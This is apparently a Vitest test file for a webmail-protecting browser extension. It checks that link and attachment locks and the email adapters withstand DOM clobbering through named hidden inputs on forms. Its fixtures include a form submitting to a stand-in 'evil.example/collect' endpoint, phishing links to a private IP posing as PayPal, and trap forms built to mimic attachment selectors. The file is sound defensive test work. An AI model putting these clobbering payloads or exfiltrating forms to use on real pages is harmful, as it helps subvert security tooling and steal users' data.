// @vitest-environment happy-dom
// Regression tests for <form> DOM clobbering. In real browsers a named control (`<input name="closest">`)
// overrides the form's built-in property of the same name, even inside extension content scripts.
// happy-dom does not implement that, so `clobber()` emulates it with own properties on the form
// (except `parentElement`, `className` and `getAttribute`, which happy-dom's own internals call).
import { describe, expect, it } from 'vitest';
import { gmail } from './adapters/gmail';
import { linksIn } from './adapters/extract';
import { outlook } from './adapters/outlook';
import { proton } from './adapters/proton';
import { yahoo } from './adapters/yahoo';
import { closestEl, eventElement, isFormEl, tagOf, textOf } from './dom';
import { lockLinks } from './ui/linkLock';
import { lockAttachments } from './ui/attachmentLock';

const CLOBBERED = [
  'closest', 'contains', 'matches', 'hasAttribute', 'querySelector', 'querySelectorAll',
  'tagName', 'localName', 'nodeType', 'textContent', 'ownerDocument', 'hidden',
  'isContentEditable', 'children',
];

function clobber(form: Element, names: readonly string[] = CLOBBERED): void {
  const doc = document;
  for (const name of names) {
    const input = doc.createElement('input');
    input.setAttribute('type', 'hidden');
    input.setAttribute('name', name);
    form.append(input);
  }
  for (const name of names) {
    const input = Element.prototype.querySelector.call(form, `input[name="${name}"]`);
    Object.defineProperty(form, name, { value: input, configurable: true });
  }
}

const form = (id = 'f') => document.getElementById(id)!;

describe('dom helpers resist <form> clobbering', () => {
  it('reads the real tag, text, ancestors, and event element of a clobbered form', () => {
    document.body.innerHTML = '<div id="wrap" class="w"><form id="f">Hello</form></div>';
    const f = form();
    // happy-dom's own closest() and event dispatch read tagName, so exercise them before shadowing it.
    clobber(f, CLOBBERED.filter((n) => n !== 'tagName'));
    expect(closestEl(f, '.w')?.id).toBe('wrap');
    let seen: Element | null = null;
    const listener = (ev: Event) => {
      seen = eventElement(ev);
    };
    document.addEventListener('submit', listener, true);
    f.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
    document.removeEventListener('submit', listener, true);
    // happy-dom wraps forms in a Proxy, so compare by id rather than identity.
    expect(seen && isFormEl(seen) && Element.prototype.getAttribute.call(seen, 'id')).toBe('f');
    clobber(f, ['tagName']);
    expect(tagOf(f)).toBe('form');
    expect(isFormEl(f)).toBe(true);
    expect(textOf(f)).toBe('Hello');
  });
});

describe('locks resist <form> clobbering', () => {
  it('still blocks submit of a clobbered form inside a locked email', () => {
    document.body.innerHTML = '<div id="m"><form id="f" action="https://evil.example/collect"><input name="q"></form></div>';
    clobber(form());
    lockLinks(document.getElementById('m')!);
    const e = new Event('submit', { bubbles: true, cancelable: true });
    form().dispatchEvent(e);
    expect(e.defaultPrevented).toBe(true);
  });

  it('still blocks clicks inside a locked attachment that contains a clobbered form', () => {
    document.body.innerHTML = '<div id="att"><form id="f"><button id="b" type="button">Open</button></form></div>';
    clobber(form());
    lockAttachments([document.getElementById('att')!]);
    const e = new MouseEvent('click', { bubbles: true, cancelable: true });
    form().dispatchEvent(e);
    expect(e.defaultPrevented).toBe(true);
  });
});

describe('extraction resists <form> clobbering', () => {
  it('linksIn keeps scanning past a clobbered form', () => {
    document.body.innerHTML =
      '<div id="m"><form id="f" action="https://evil.example/f"></form><a href="http://192.168.4.20/login">PayPal</a></div>';
    clobber(form());
    expect(linksIn(document.getElementById('m')!)).toEqual([
      { text: '', href: 'https://evil.example/f' },
      { text: 'PayPal', href: 'http://192.168.4.20/login' },
    ]);
  });

  const PHISH_LINK = '<a href="http://192.168.4.20/login">Verify</a>';
  // Each form carries attributes that match the adapter's attachment / header / body selectors.
  const TRAP_FORM =
    '<form id="f" role="document" download_url="application/pdf:x.pdf:https://x.example/x" data-testid="attachment-item" ' +
    'data-test-id="attachment-tile" class="hq attachmentWell" aria-label="Download all From attachment" title="a@b.example"></form>';

  const cases = [
    {
      name: 'gmail',
      adapter: gmail,
      html: `<div class="adn"><h3 class="iw"><span class="gD" email="x@evil.example">X</span></h3><div class="a3s">Hi ${PHISH_LINK}${TRAP_FORM}</div></div>`,
    },
    {
      name: 'outlook',
      adapter: outlook,
      html: `<div data-app-section="ConversationContainer"><div aria-label="Email message"><span class="OZZZK">X &lt;x@evil.example&gt;</span><div aria-label="Message body">Hi ${PHISH_LINK}${TRAP_FORM}</div></div></div>`,
    },
    {
      name: 'yahoo',
      adapter: yahoo,
      html: `<div data-test-id="message-card"><span data-test-id="message-from" title="x@evil.example">X</span><div data-test-id="message-view-body-content">Hi ${PHISH_LINK}${TRAP_FORM}</div></div>`,
    },
    {
      name: 'proton',
      adapter: proton,
      html: `<article><span data-testid="message-header:from" title="x@evil.example">X</span><div data-testid="message-content:body">Hi ${PHISH_LINK}${TRAP_FORM}</div></article>`,
    },
  ];

  for (const { name, adapter, html } of cases) {
    it(`${name} adapter extracts the email and ignores the clobbered form as a header or attachment`, () => {
      document.body.innerHTML = html;
      clobber(form());
      const all = adapter.extractAll!(document);
      expect(all).toHaveLength(1);
      expect(all[0].senderAddress).toBe('x@evil.example');
      expect(all[0].links.map((l) => l.href)).toContain('http://192.168.4.20/login');
      expect((all[0].attachments ?? []).some((a) => a.element === form())).toBe(false);
      expect((all[0].attachmentContainers ?? []).includes(form())).toBe(false);
    });
  }
});
